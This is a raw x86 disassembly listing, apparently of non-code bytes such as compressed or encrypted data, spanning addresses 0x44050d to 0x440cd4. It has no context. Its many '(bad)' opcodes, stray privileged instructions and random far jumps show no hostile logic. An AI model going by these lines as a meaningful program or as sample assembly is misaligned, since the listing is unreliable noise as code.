  44050d:	push   es
  44050e:	aam    0xbb
  440510:	pop    esp
  440511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  440512:	outs   dx,DWORD PTR ds:[esi]
  440513:	cwde   
  440514:	dec    edx
  440515:	xchg   BYTE PTR [ecx-0x689f4f0b],bh
  44051b:	jl     0x4404f6
  44051d:	rol    dh,1
  44051f:	jl     0x4404bb
  440521:	das    
  440522:	je     0x440571
  440524:	imul   edi,edx,0xffffffde
  440527:	icebp  
  440528:	test   esp,esi
  44052a:	push   es
  44052b:	adc    al,0xd7
  44052d:	push   edx
  44052e:	inc    ebp
  44052f:	mov    BYTE PTR [esi+0x67],ah
  440532:	or     eax,0x115bd39e
  440537:	push   0x2d
  440539:	sbb    eax,0x3474eb9a
  44053e:	xchg   edx,eax
  44053f:	jle    0x440547
  440541:	xchg   DWORD PTR [edx+0x4db88d36],edx
  440547:	shl    DWORD PTR [esi-0x4a04cdae],cl
  44054d:	sub    eax,0xc3e54ea2
  440552:	or     cl,BYTE PTR [edx+ebp*2]
  440555:	bound  esp,QWORD PTR [eax]
  440557:	leave  
  440558:	jmp    0x3089:0x77605d88
  44055f:	xor    bh,cl
  440561:	rcl    DWORD PTR [edi+0xe577d09],0xcc
  440568:	into   
  440569:	pop    esi
  44056a:	or     dl,BYTE PTR [edi-0x2f7ab320]
  440570:	ins    DWORD PTR es:[edi],dx
  440571:	(bad)  
  440572:	jp     0x44058d
  440574:	dec    esp
  440575:	cwde   
  440576:	xchg   esi,eax
  440577:	fisubr DWORD PTR [eax]
  440579:	hlt    
  44057a:	jb     0x4405df
  44057c:	js     0x44051a
  44057e:	mov    ds:0xa97ee7d5,al
  440583:	xlat   BYTE PTR ds:[ebx]
  440584:	xchg   DWORD PTR [ebx+edx*4],edx
  440587:	and    bl,BYTE PTR [edi-0x1a]
  44058a:	sbb    eax,0x1064e418
  44058f:	adc    DWORD PTR [ecx],edx
  440591:	hlt    
  440592:	rcr    edi,1
  440594:	xchg   ebp,esi
  440596:	xor    al,0xbf
  440598:	loopne 0x4405ba
  44059a:	je     0x4405dc
  44059c:	or     al,0x6b
  44059e:	push   0xffffffed
  4405a0:	test   BYTE PTR [ebp-0x7e],0x99
  4405a4:	xchg   edi,eax
  4405a5:	mov    BYTE PTR [esi-0x5405b4f8],bl
  4405ab:	repz cmp ecx,ecx
  4405ae:	xor    DWORD PTR [esi],ebx
  4405b0:	out    0x3a,eax
  4405b2:	cmp    eax,0x3d67def3
  4405b7:	dec    ebp
  4405b8:	in     eax,dx
  4405b9:	and    ebp,ebx
  4405bb:	sbb    eax,0xf5a3634b
  4405c0:	add    ebp,0xd09d63c6
  4405c6:	mov    eax,0xa77f91f6
  4405cb:	(bad)  
  4405cc:	and    eax,0x9ec7574f
  4405d1:	inc    edx
  4405d2:	sub    eax,0x15b4ff7d
  4405d7:	push   ebp
  4405d8:	retf   
  4405d9:	sub    ah,0x3d
  4405dc:	call   0xfe38:0x92fb73c8
  4405e3:	xchg   ecx,eax
  4405e4:	jbe    0x44061b
  4405e6:	ja     0x4405d2
  4405e8:	pop    ebp
  4405e9:	popa   
  4405ea:	cli    
  4405eb:	popa   
  4405ec:	mov    ebp,0x978a58ab
  4405f1:	and    al,0x64
  4405f3:	dec    ecx
  4405f4:	sahf   
  4405f5:	mov    ecx,0x60173617
  4405fa:	popa   
  4405fb:	enter  0x534,0xd8
  4405ff:	test   eax,0x9ba9bdb0
  440604:	push   eax
  440605:	sub    dl,BYTE PTR [ebx+ecx*1-0x58]
  440609:	das    
  44060a:	cmp    edx,DWORD PTR [edx-0x2d1d0359]
  440610:	mov    eax,ds:0xbf768415
  440615:	jnp    0x440641
  440617:	dec    edx
  440618:	ja     0x440607
  44061a:	ret    0x1d81
  44061d:	addr16 mov edx,0xb9f9ebc
  440623:	in     al,dx
  440624:	sbb    DWORD PTR [ecx],ebp
  440626:	test   BYTE PTR ds:0x61d36979,cl
  44062c:	dec    edi
  44062d:	cmp    eax,0x57adf36a
  440632:	push   edx
  440633:	mov    eax,0xe55efab0
  440638:	aaa    
  440639:	mov    al,ds:0x5acf9396
  44063e:	xchg   esi,eax
  44063f:	cli    
  440640:	or     eax,0x471125a3
  440645:	push   0x8e27d8b8
  44064a:	mov    ah,0xba
  44064c:	mov    dl,0x2a
  44064e:	xor    DWORD PTR [edi+0x658f6f0f],ebx
  440654:	das    
  440655:	setle  BYTE PTR [ecx+0x38]
  440659:	sbb    BYTE PTR [eax+0x3c388163],ch
  44065f:	push   eax
  440660:	cwde   
  440661:	scas   eax,DWORD PTR es:[edi]
  440662:	lods   eax,DWORD PTR ds:[esi]
  440663:	loopne 0x4406b3
  440665:	shl    BYTE PTR [esi+0x26],cl
  440668:	or     eax,0xa9362670
  44066d:	lock fisub DWORD PTR [ecx-0x45]
  440671:	adc    al,0x2d
  440673:	addr16 push esi
  440675:	daa    
  440676:	fdivr  DWORD PTR [esp+ebx*4]
  440679:	out    dx,eax
  44067a:	xchg   edi,eax
  44067b:	sbb    DWORD PTR [edx*8-0x1799b976],ebx
  440682:	iret   
  440683:	push   cs
  440684:	add    eax,0x3f6fd632
  440689:	mov    esi,DWORD PTR [eax+eiz*2+0xa]
  44068d:	loope  0x440682
  44068f:	pop    ebx
  440690:	sbb    eax,0xecce495c
  440695:	dec    ebp
  440696:	ds sub ebx,esi
  440699:	xchg   edx,edi
  44069b:	cmp    ah,BYTE PTR [ebp+0x1f5d64fe]
  4406a1:	(bad)  
  4406a2:	iret   
  4406a3:	sub    al,0x7c
  4406a5:	xor    edi,DWORD PTR [eax+0x3]
  4406a8:	lock retf 
  4406aa:	sub    bh,BYTE PTR [ebx]
  4406ac:	pushf  
  4406ad:	mov    ecx,0x489ee9e
  4406b2:	jbe    0x4406f4
  4406b4:	adc    ch,BYTE PTR [eax]
  4406b6:	and    al,0x68
  4406b8:	mov    al,0xe0
  4406ba:	bound  ebp,QWORD PTR [ebx+ecx*1-0x42a8e919]
  4406c1:	sti    
  4406c2:	mov    bh,0x61
  4406c4:	mov    dh,0x3b
  4406c6:	rcr    DWORD PTR [eax],1
  4406c8:	xchg   ebp,eax
  4406c9:	out    dx,al
  4406ca:	push   esi
  4406cb:	nop
  4406cc:	push   esi
  4406cd:	leave  
  4406ce:	out    dx,al
  4406cf:	outs   dx,BYTE PTR ds:[esi]
  4406d0:	push   cs
  4406d1:	data16 stc 
  4406d3:	and    DWORD PTR [edi],esp
  4406d5:	int    0xfd
  4406d7:	(bad)  
  4406d8:	dec    esp
  4406d9:	add    al,BYTE PTR [ebx+0x1d503b0e]
  4406df:	add    dh,BYTE PTR [ebp+0x65]
  4406e2:	and    edi,DWORD PTR [edi-0x25]
  4406e5:	lock int 0xcf
  4406e8:	jae    0x440689
  4406ea:	dec    ebx
  4406eb:	imul   eax,DWORD PTR [ebx],0x23653010
  4406f1:	ins    DWORD PTR es:[edi],dx
  4406f2:	fs mov al,0xe9
  4406f5:	rol    ecx,0x48
  4406f8:	and    eax,0xa2b0be8
  4406fd:	mov    bh,0x85
  4406ff:	bound  ebp,QWORD PTR [edx-0x2f2ddd90]
  440705:	cmp    ebx,DWORD PTR ds:0x4a2fd6b0
  44070b:	dec    esi
  44070c:	add    ecx,DWORD PTR [esi*2+0x1813bb69]
  440713:	leave  
  440714:	je     0x4406f1
  440716:	xor    dl,BYTE PTR [edi]
  440718:	icebp  
  440719:	loope  0x44070e
  44071b:	adc    dh,al
  44071d:	shr    BYTE PTR [ecx-0x3c],1
  440720:	inc    esi
  440721:	add    al,0x3b
  440723:	stc    
  440724:	jns    0x4406ea
  440726:	and    BYTE PTR [esi],bh
  440728:	out    0x6a,al
  44072a:	dec    esi
  44072b:	dec    edi
  44072c:	sbb    ah,BYTE PTR [ecx+0x7dfd5229]
  440732:	fidiv  WORD PTR [ecx-0x59]
  440735:	add    DWORD PTR [edi+0x6d],0xfffffff2
  440739:	pop    ss
  44073a:	pop    edx
  44073b:	jne    0x440728
  44073d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44073e:	imul   ebx,DWORD PTR [eax+0x664915a8],0xb3b94988
  440748:	ds sbb dl,0xce
  44074c:	jbe    0x4406e9
  44074e:	jl     0x44073d
  440750:	adc    edx,eax
  440752:	outs   dx,DWORD PTR ds:[esi]
  440753:	in     al,0xbf
  440755:	jmp    0x81144685
  44075a:	xchg   ecx,eax
  44075b:	inc    ecx
  44075c:	in     al,dx
  44075d:	push   ss
  44075e:	cwde   
  44075f:	mov    DWORD PTR cs:[ecx+edx*2],esp
  440763:	and    al,0x1a
  440765:	icebp  
  440766:	cwde   
  440767:	mov    cs:0x4ad501b8,eax
  44076d:	pop    esp
  44076e:	xlat   BYTE PTR ds:[ebx]
  44076f:	stos   BYTE PTR es:[edi],al
  440770:	push   ss
  440771:	iret   
  440772:	push   esi
  440773:	pop    esi
  440774:	jns    0x44078b
  440776:	push   cs
  440777:	pop    ecx
  440778:	pop    ebp
  440779:	pop    edi
  44077a:	fistp  DWORD PTR [eax+0x7a]
  44077d:	cld    
  44077e:	nop
  44077f:	nop
  440780:	(bad)  [edi-0x3]
  440783:	rcl    DWORD PTR [eax-0x6c],0x60
  440787:	pop    esi
  440788:	frstor [ebx]
  44078a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44078b:	push   ds
  44078c:	cwde   
  44078d:	in     al,0x4
  44078f:	inc    eax
  440790:	lods   al,BYTE PTR ds:[esi]
  440791:	pop    edx
  440792:	mov    eax,ds:0xc775cd5d
  440797:	mov    eax,ds:0x4360c8e1
  44079c:	nop
  44079d:	aaa    
  44079e:	shr    DWORD PTR [esi-0x13],cl
  4407a1:	imul   esi,DWORD PTR [edx],0x3a
  4407a4:	mov    ch,0x9c
  4407a6:	cmc    
  4407a7:	push   esp
  4407a8:	test   DWORD PTR [edi],esi
  4407aa:	xor    eax,DWORD PTR [ebp+0x2ed848a0]
  4407b0:	jl     0x440823
  4407b2:	sbb    DWORD PTR [eax+ecx*4-0x7cfe72a2],edi
  4407b9:	add    esp,DWORD PTR [esi+0x41015eab]
  4407bf:	lods   ax,WORD PTR ds:[esi]
  4407c1:	mov    ah,bh
  4407c3:	pushf  
  4407c4:	fiadd  WORD PTR [ebp+eax*8-0x6c]
  4407c8:	cmp    eax,0xcf309a94
  4407cd:	inc    eax
  4407ce:	jb     0x44081a
  4407d0:	xchg   ebx,eax
  4407d1:	(bad)  
  4407d2:	into   
  4407d3:	std    
  4407d4:	jp     0x4407df
  4407d6:	push   ss
  4407d7:	fucomip st,st(6)
  4407d9:	xor    al,0xd0
  4407db:	retf   
  4407dc:	sub    BYTE PTR fs:[ebx+ebx*4],cl
  4407e0:	int    0x86
  4407e2:	jne    0x440795
  4407e4:	dec    eax
  4407e5:	or     al,0x42
  4407e7:	xchg   BYTE PTR [edi+edx*2-0x2b],ch
  4407eb:	inc    esi
  4407ec:	inc    edx
  4407ed:	mov    DWORD PTR [edx+0x49],eax
  4407f0:	or     ecx,ebp
  4407f2:	jae    0x440808
  4407f4:	icebp  
  4407f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4407f6:	cmp    DWORD PTR [edi+0x32],edi
  4407f9:	sub    BYTE PTR ds:0xe8ffb13d,0x6
  440800:	js     0x440783
  440802:	xlat   BYTE PTR ds:[ebx]
  440803:	mov    eax,0xd4df6db5
  440808:	daa    
  440809:	jge    0x440854
  44080b:	mov    dh,0x7b
  44080d:	addr16 aam 0x23
  440810:	psubb  mm6,QWORD PTR [edi]
  440813:	(bad)  
  440814:	ffreep st(3)
  440816:	fsub   QWORD PTR ds:0x1d937690
  44081c:	adc    al,0x93
  44081e:	fwait
  44081f:	mov    dh,0xfc
  440821:	dec    esp
  440822:	jns    0x44086d
  440824:	inc    ebx
  440825:	(bad)  
  440826:	sub    eax,0x95c46453
  44082b:	mov    ah,0xa3
  44082d:	push   cs
  44082e:	gs jb  0x4407b4
  440831:	cmp    al,0xbe
  440833:	out    0xee,al
  440835:	lahf   
  440836:	les    esi,FWORD PTR [ebx]
  440838:	push   esi
  440839:	sbb    cl,ch
  44083b:	cli    
  44083c:	bound  edi,QWORD PTR [ebx+eiz*8+0x61]
  440840:	inc    esp
  440841:	mov    edi,0xa64e9d06
  440846:	stc    
  440847:	jo     0x4407f3
  440849:	addr16 mov eax,0x90f7e420
  44084f:	pusha  
  440850:	clc    
  440851:	(bad)  
  440852:	loopne 0x44087d
  440854:	mov    ah,0x25
  440856:	popa   
  440857:	add    eax,0xafb63501
  44085c:	inc    edi
  44085d:	pushf  
  44085e:	mov    ds:0x8d0d5873,al
  440863:	lock pop edi
  440865:	in     eax,dx
  440866:	mov    esp,0x390f38f0
  44086b:	out    dx,al
  44086c:	mov    ebx,0x34c661a1
  440871:	adc    ebp,ebp
  440873:	cmp    al,0xd4
  440875:	lods   al,BYTE PTR ds:[esi]
  440876:	sbb    BYTE PTR [esi],0xff
  440879:	jge    0x440808
  44087b:	retf   
  44087c:	ds and ch,0x95
  440880:	out    dx,al
  440881:	push   es
  440882:	mov    edx,0xbffa40c7
  440887:	sbb    bl,dl
  440889:	push   ss
  44088a:	jo     0x440863
  44088c:	or     al,0xbb
  44088e:	aam    0x5a
  440890:	add    BYTE PTR [edi],dh
  440892:	mov    ah,0xf6
  440894:	push   0xf183f65f
  440899:	push   edi
  44089a:	mov    ebp,edx
  44089c:	enter  0xc83e,0x46
  4408a0:	div    BYTE PTR [edx-0x1c72170b]
  4408a6:	popa   
  4408a7:	outs   dx,BYTE PTR ds:[esi]
  4408a8:	xchg   ebx,eax
  4408a9:	jbe    0x4408fb
  4408ab:	(bad)  
  4408ac:	cli    
  4408ad:	outs   dx,DWORD PTR ds:[esi]
  4408ae:	enter  0x2f3b,0xf6
  4408b2:	jb     0x4408b0
  4408b4:	push   edi
  4408b5:	or     BYTE PTR [ecx],0xcb
  4408b8:	cld    
  4408b9:	adc    al,0xc5
  4408bb:	pop    ebx
  4408bc:	mov    al,0x26
  4408be:	xor    eax,0xeab60748
  4408c3:	sub    DWORD PTR [eax],esi
  4408c5:	jb     0xee7827b8
  4408cb:	mov    ds,WORD PTR [ebp-0x38e3bb6e]
  4408d1:	cmp    dl,ch
  4408d3:	fadd   st,st(2)
  4408d5:	inc    ecx
  4408d6:	call   0x78c50c49
  4408db:	jg     0x44091d
  4408dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4408de:	xchg   esi,eax
  4408df:	out    dx,al
  4408e0:	mov    eax,ds:0x7d5c80aa
  4408e5:	jle    0x440886
  4408e7:	jg     0x44094d
  4408e9:	mov    ecx,0x8c8d62e9
  4408ee:	gs inc ebp
  4408f0:	test   al,0x6c
  4408f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4408f3:	pop    ebx
  4408f4:	lods   eax,DWORD PTR ds:[esi]
  4408f5:	lods   eax,DWORD PTR ds:[esi]
  4408f6:	rol    bl,1
  4408f8:	enter  0xffe3,0x12
  4408fc:	std    
  4408fd:	and    BYTE PTR [ebp+0x6d47bb50],0xdb
  440904:	or     DWORD PTR ds:0x3071252c,esp
  44090a:	or     BYTE PTR [edx-0x22],dl
  44090d:	repnz pop ecx
  44090f:	pusha  
  440910:	das    
  440911:	popa   
  440912:	and    BYTE PTR [esi-0x4d],al
  440915:	add    BYTE PTR [edx],0xd2
  440918:	mov    ebx,0xba8b498
  44091d:	dec    eax
  44091e:	imul   eax,DWORD PTR [ebx],0x4
  440921:	and    edx,esp
  440923:	cmp    dh,bl
  440925:	adc    ebx,DWORD PTR ss:[edi+ebx*4-0x46]
  44092a:	test   BYTE PTR [edx-0x1d],ch
  44092d:	adc    BYTE PTR [ecx+0x69],dl
  440930:	mov    edi,0xdcb88875
  440935:	test   BYTE PTR [edi-0x1fa71a85],dl
  44093b:	mov    bh,0x42
  44093d:	jmp    0x7f05:0xe4a57935
  440944:	rol    DWORD PTR [edi],1
  440946:	sbb    ch,BYTE PTR [edi+0x1c]
  440949:	imul   eax,DWORD PTR [edi],0x85339e3e
  44094f:	sub    eax,0x429f7cde
  440954:	sar    BYTE PTR [edx],0xd8
  440957:	cmp    ecx,ecx
  440959:	imul   esp,DWORD PTR ds:0xb5effbe4,0xfb6605e0
  440963:	mov    cl,0x7b
  440965:	lock mov ebx,esi
  440968:	fstp   TBYTE PTR [ebp-0x77]
  44096b:	mov    bh,0xcd
  44096d:	lds    esi,FWORD PTR [edx]
  44096f:	rcl    DWORD PTR [edi+0x26],cl
  440972:	dec    ebp
  440973:	fidiv  WORD PTR [edx]
  440975:	sahf   
  440976:	loopne 0x440900
  440978:	stos   DWORD PTR es:[edi],eax
  440979:	leave  
  44097a:	mov    ah,0x4c
  44097c:	dec    esp
  44097d:	push   esp
  44097e:	aaa    
  44097f:	aad    0x98
  440981:	aam    0x4c
  440983:	stc    
  440984:	sbb    BYTE PTR [edi-0x43],0x48
  440988:	fnstenv [eax+0x2f]
  44098b:	cmp    al,0x66
  44098d:	push   0x2e
  44098f:	lock or DWORD PTR [ebx],0x64
  440993:	je     0x44099b
  440995:	popa   
  440996:	ror    esp,1
  440998:	pop    ebp
  440999:	and    cl,BYTE PTR [edx+edx*2-0x37]
  44099d:	mov    bl,0x34
  44099f:	into   
  4409a0:	(bad)
  4409a3:	push   ebp
  4409a4:	dec    esi
  4409a5:	cwde   
  4409a6:	inc    ebp
  4409a7:	scas   eax,DWORD PTR es:[edi]
  4409a8:	inc    edx
  4409a9:	das    
  4409aa:	sbb    esi,edi
  4409ac:	dec    esp
  4409ad:	sub    DWORD PTR [eax-0x1b9206e1],0x7d
  4409b4:	stos   BYTE PTR es:[edi],al
  4409b5:	and    BYTE PTR [edx],0x8b
  4409b8:	xchg   DWORD PTR [esi],esi
  4409ba:	shl    DWORD PTR [edx+0x51],cl
  4409bd:	pop    eax
  4409be:	pop    edx
  4409bf:	sti    
  4409c0:	in     eax,dx
  4409c1:	or     eax,0xe9283b5
  4409c6:	enter  0x6c20,0x82
  4409ca:	dec    esi
  4409cb:	cvtdq2ps xmm7,XMMWORD PTR [ebp+0xf]
  4409cf:	and    ch,BYTE PTR [ecx+0x3a]
  4409d2:	mov    esi,0x96a0ce73
  4409d7:	mov    al,ds:0x9ca2f997
  4409dc:	sub    eax,0x4b1fee2a
  4409e1:	inc    DWORD PTR [edx-0x6f06704]
  4409e7:	ret    0x447
  4409ea:	jnp    0x440980
  4409ec:	mov    ecx,0x5015932e
  4409f1:	pop    ss
  4409f2:	and    al,0x26
  4409f4:	xchg   esp,eax
  4409f5:	(bad)  
  4409f6:	sub    BYTE PTR [ebx+0x2a],al
  4409f9:	pop    ebx
  4409fa:	(bad)  
  4409fb:	jb     0x4409b1
  4409fd:	lea    edx,[ebx+0x14ed1731]
  440a03:	(bad)  
  440a04:	leave  
  440a05:	idiv   DWORD PTR ds:0x725e6517
  440a0b:	or     al,al
  440a0d:	adc    eax,DWORD PTR [edi]
  440a0f:	add    eax,0x54f007a4
  440a14:	push   ds
  440a15:	sub    BYTE PTR [edi+0xa],ah
  440a18:	inc    edx
  440a19:	add    DWORD PTR [eax+0x39],ebx
  440a1c:	inc    ebx
  440a1d:	sbb    ah,ah
  440a1f:	ror    DWORD PTR [edi+0x21dffcb0],0x65
  440a26:	fbld   TBYTE PTR gs:[edi+0x3c]
  440a2a:	ficomp WORD PTR [edi-0x62]
  440a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  440a2e:	and    eax,0xd02ccb5b
  440a33:	int3   
  440a34:	jg     0x4409d1
  440a36:	mov    eax,ds:0x455c9f02
  440a3b:	lods   eax,DWORD PTR ds:[esi]
  440a3c:	addr16 push ss
  440a3e:	icebp  
  440a3f:	xor    ebp,DWORD PTR [ebp-0x6d7b65f5]
  440a45:	jb     0x440a86
  440a47:	(bad)  
  440a48:	jmp    0x440a8c
  440a4a:	mov    eax,ds:0xc2046cac
  440a4f:	loope  0x440a9d
  440a51:	imul   ebp,DWORD PTR [eax-0x71],0x8d586401
  440a58:	xor    ah,cl
  440a5a:	(bad)  
  440a5b:	fistp  DWORD PTR [ecx+0x1690ca7f]
  440a61:	out    0xeb,eax
  440a63:	icebp  
  440a64:	mov    bl,0x32
  440a66:	jg     0x4409f1
  440a68:	mov    al,0xe5
  440a6a:	mov    ebx,0x5708a21c
  440a6f:	dec    esi
  440a70:	cmc    
  440a71:	and    DWORD PTR [edi-0x45],ebx
  440a74:	ficom  WORD PTR [edi+0x26]
  440a77:	dec    eax
  440a78:	xchg   edx,eax
  440a79:	mov    ecx,0x5378f7d9
  440a7e:	jecxz  0x440a59
  440a80:	jae    0x440a99
  440a82:	push   ebx
  440a83:	into   
  440a84:	mov    dl,0x7d
  440a86:	sbb    eax,DWORD PTR [edi-0x24]
  440a89:	shl    edi,1
  440a8b:	fnstsw WORD PTR [eax-0x7d]
  440a8e:	jg     0x440a71
  440a90:	inc    esi
  440a91:	int    0x8
  440a93:	mov    edx,0x1069b2f0
  440a98:	mov    eax,0x40d44414
  440a9d:	pushf  
  440a9e:	xchg   esp,eax
  440a9f:	je     0x440ac1
  440aa1:	fnstenv [edi-0x37fa394]
  440aa7:	xchg   esp,eax
  440aa8:	cmp    eax,0x7dddf379
  440aad:	pop    es
  440aae:	shr    BYTE PTR [esi],cl
  440ab0:	int3   
  440ab1:	sbb    eax,0x485f5eb4
  440ab6:	xor    BYTE PTR [ecx],dh
  440ab8:	iret   
  440ab9:	ds clc 
  440abb:	sbb    eax,0xfe9fd20b
  440ac0:	adc    BYTE PTR [esi+ebx*4],al
  440ac3:	in     al,dx
  440ac4:	ja     0x440ae5
  440ac6:	xchg   esi,eax
  440ac7:	fst    DWORD PTR [eax]
  440ac9:	mov    dh,0xa2
  440acb:	and    DWORD PTR [edi-0xd],0x6ec0ffd1
  440ad2:	sub    edi,DWORD PTR [ebx]
  440ad4:	addr16 sahf 
  440ad6:	daa    
  440ad7:	hlt    
  440ad8:	mov    ah,BYTE PTR [esp+eiz*2-0x1f]
  440adc:	mov    eax,ds:0x9fcccf63
  440ae1:	loopne 0x440b47
  440ae3:	iret   
  440ae4:	sub    BYTE PTR ds:0x757a3e4,cl
  440aea:	jmp    0xf502:0x125aa9e4
  440af1:	sbb    BYTE PTR [eax],al
  440af3:	mov    ah,0xbd
  440af5:	pop    ecx
  440af6:	xor    DWORD PTR [edi],eax
  440af8:	popa   
  440af9:	mov    ah,0x51
  440afb:	mov    al,0x39
  440afd:	ret    
  440afe:	retf   
  440aff:	retf   
  440b00:	adc    eax,0x69ae1d7a
  440b05:	adc    cl,dl
  440b07:	xor    ch,BYTE PTR [ebx+0x3a3b9e2e]
  440b0d:	xor    al,0xb3
  440b0f:	stos   BYTE PTR es:[edi],al
  440b10:	push   0xfffffff6
  440b12:	stos   BYTE PTR es:[edi],al
  440b13:	lock mov edx,?
  440b16:	inc    ebx
  440b17:	add    bl,BYTE PTR ds:0xe5899a59
  440b1d:	xchg   edx,eax
  440b1e:	or     ch,bh
  440b20:	(bad)  
  440b22:	cmp    esi,DWORD PTR [edx]
  440b24:	cmp    al,0xc2
  440b26:	cdq    
  440b27:	mov    ds:0x89350c86,eax
  440b2c:	mov    ebp,0x6718293b
  440b31:	test   eax,0x1db0dcc9
  440b36:	jge    0x440b61
  440b38:	arpl   dx,bp
  440b3a:	cmp    bh,BYTE PTR [ecx-0x29]
  440b3d:	sbb    edi,ebx
  440b3f:	adc    BYTE PTR [ebp+0x21],bh
  440b42:	bound  eax,QWORD PTR [eax-0x4a]
  440b45:	pop    ss
  440b46:	cmc    
  440b47:	test   eax,0xb5f11d38
  440b4c:	jb     0x440b6e
  440b4e:	mov    cl,0x65
  440b50:	stc    
  440b51:	xor    eax,0xcf2b0901
  440b56:	and    eax,0xb4f76c41
  440b5b:	test   BYTE PTR [edi+0x3],0x23
  440b5f:	cmp    DWORD PTR [edx-0x195ea433],edi
  440b65:	fwait
  440b66:	ret    0x56c8
  440b69:	mov    ebx,0xff4aaa95
  440b6e:	xor    ebp,DWORD PTR [ebx+0x527f48d5]
  440b74:	jns    0x440beb
  440b76:	xor    BYTE PTR [eax],bh
  440b78:	call   0x4133ebd
  440b7d:	lock shl DWORD PTR [esi+edi*2],cl
  440b81:	adc    edi,ebp
  440b83:	stc    
  440b84:	add    bl,BYTE PTR [edi-0x5f]
  440b87:	cwde   
  440b88:	fdivrp st(5),st
  440b8a:	pop    esi
  440b8b:	stos   BYTE PTR es:[edi],al
  440b8c:	pushf  
  440b8d:	int    0x4a
  440b8f:	sbb    DWORD PTR [eax],0xffffffb1
  440b92:	push   ds
  440b93:	mov    ecx,0x501b8aa5
  440b98:	cmc    
  440b99:	add    eax,0xffffffca
  440b9c:	inc    esp
  440b9d:	es into 
  440b9f:	mov    WORD PTR [edx+0x5dd808e2],ds
  440ba5:	fmul   st(1),st
  440ba7:	ror    BYTE PTR [edx+0x4a],0x0
  440bab:	xor    bl,BYTE PTR ds:0x3fc09d2f
  440bb1:	xchg   DWORD PTR [esi],edi
  440bb3:	pop    ecx
  440bb4:	xchg   ebp,eax
  440bb5:	pop    esp
  440bb6:	das    
  440bb7:	adc    esi,DWORD PTR [eax]
  440bb9:	ja     0x440bda
  440bbb:	lods   eax,DWORD PTR ds:[esi]
  440bbc:	rol    DWORD PTR [ebx+0x79a40488],1
  440bc2:	and    ch,BYTE PTR [ecx-0x642f992f]
  440bc8:	fwait
  440bc9:	xor    ecx,DWORD PTR [edi]
  440bcb:	ror    cl,cl
  440bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440bce:	in     eax,0x81
  440bd0:	inc    ecx
  440bd1:	cmp    dl,BYTE PTR [ebx]
  440bd3:	mov    eax,ds:0xc602b568
  440bd8:	das    
  440bd9:	push   esi
  440bda:	test   eax,0xf5a2cd62
  440bdf:	add    BYTE PTR [ebp-0x4e],bh
  440be2:	xchg   ecx,eax
  440be3:	in     al,dx
  440be4:	cmc    
  440be5:	mul    BYTE PTR [ecx-0x76e9485d]
  440beb:	xchg   ebp,eax
  440bec:	sbb    DWORD PTR [esi+0x7],eax
  440bef:	jnp    0x440be7
  440bf1:	lods   eax,DWORD PTR ds:[esi]
  440bf2:	mov    eax,ds:0x87d9b86c
  440bf7:	adc    bh,ah
  440bf9:	test   BYTE PTR [esi],dl
  440bfb:	sub    ecx,DWORD PTR [ebp-0x6130f253]
  440c01:	outs   dx,DWORD PTR ds:[esi]
  440c02:	sub    cl,0xf4
  440c05:	shr    BYTE PTR [ecx+0x4c],1
  440c08:	push   edx
  440c09:	std    
  440c0a:	pushf  
  440c0b:	pop    es
  440c0c:	js     0x440c7d
  440c0e:	dec    ebx
  440c0f:	outs   dx,BYTE PTR ds:[esi]
  440c10:	sbb    al,0x20
  440c12:	inc    eax
  440c13:	inc    ebp
  440c14:	inc    esp
  440c15:	push   esi
  440c16:	in     eax,0x6d
  440c18:	ins    DWORD PTR es:[edi],dx
  440c19:	or     eax,0x9c849a0f
  440c1e:	shl    BYTE PTR [ecx+0x44],1
  440c21:	fild   WORD PTR [ecx+0x4781aefc]
  440c27:	(bad)  
  440c28:	repz mov bh,0xb8
  440c2b:	clc    
  440c2c:	dec    edi
  440c2d:	adc    ah,BYTE PTR [ecx-0x75ecd05b]
  440c33:	and    ecx,ebx
  440c35:	out    0xd4,al
  440c37:	xchg   edi,eax
  440c38:	aaa    
  440c39:	add    al,0x84
  440c3b:	stos   BYTE PTR es:[edi],al
  440c3c:	or     DWORD PTR ds:0x8b4af29f,0x3e
  440c43:	push   esi
  440c44:	(bad)  
  440c45:	sub    esi,DWORD PTR [ebx-0x41f5cdcc]
  440c4b:	jecxz  0x440cc4
  440c4d:	mov    bl,0xcd
  440c4f:	add    ebp,0x1a9dade6
  440c55:	lock mov ch,0xc5
  440c58:	mov    eax,ds:0x401d6227
  440c5d:	out    0xc2,eax
  440c5f:	shr    DWORD PTR [edx+eiz*4],cl
  440c62:	stc    
  440c63:	retf   
  440c64:	fisttp DWORD PTR ds:0x784ec657
  440c6a:	ret    0x9616
  440c6d:	test   DWORD PTR fs:[edi-0x5c21a4b4],0x7c804c0a
  440c78:	pop    ss
  440c79:	das    
  440c7a:	xchg   esi,eax
  440c7b:	(bad)  
  440c7c:	cmp    ecx,DWORD PTR [edx]
  440c7e:	sub    esi,esi
  440c80:	dec    ebx
  440c81:	jne    0x440c42
  440c83:	bound  ecx,QWORD PTR [ebx-0x2f59e7f4]
  440c89:	add    al,0xbb
  440c8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  440c8c:	out    dx,eax
  440c8d:	push   edi
  440c8e:	enter  0xa74a,0xa6
  440c92:	shl    DWORD PTR [esi],cl
  440c94:	(bad)  
  440c95:	xchg   ebx,eax
  440c96:	cmp    ebp,DWORD PTR [esi-0x2e]
  440c99:	mov    eax,ds:0x4329b224
  440c9e:	mov    bl,0x91
  440ca0:	and    BYTE PTR [ecx],ah
  440ca2:	pusha  
  440ca3:	shr    cl,cl
  440ca5:	and    ecx,edi
  440ca7:	mov    edx,0x4e2e41f8
  440cac:	(bad)  
  440cae:	ficom  DWORD PTR [edx]
  440cb0:	inc    dl
  440cb2:	in     al,dx
  440cb3:	adc    cl,BYTE PTR [ebx+0x22f8e085]
  440cb9:	xlat   BYTE PTR ds:[ebx]
  440cba:	mov    ebx,0x29ed773f
  440cbf:	mov    bl,dh
  440cc1:	xchg   DWORD PTR [edi+eiz*4-0x1b],edi
  440cc5:	push   ebx
  440cc6:	xchg   edx,eax
  440cc7:	mov    ebx,0x8a107959
  440ccc:	jg     0x440c98
  440cce:	xor    BYTE PTR [ecx+0x1f],cl
  440cd1:	push   edx
  440cd2:	jp     0x440c55
  440cd4:	inc    ecx
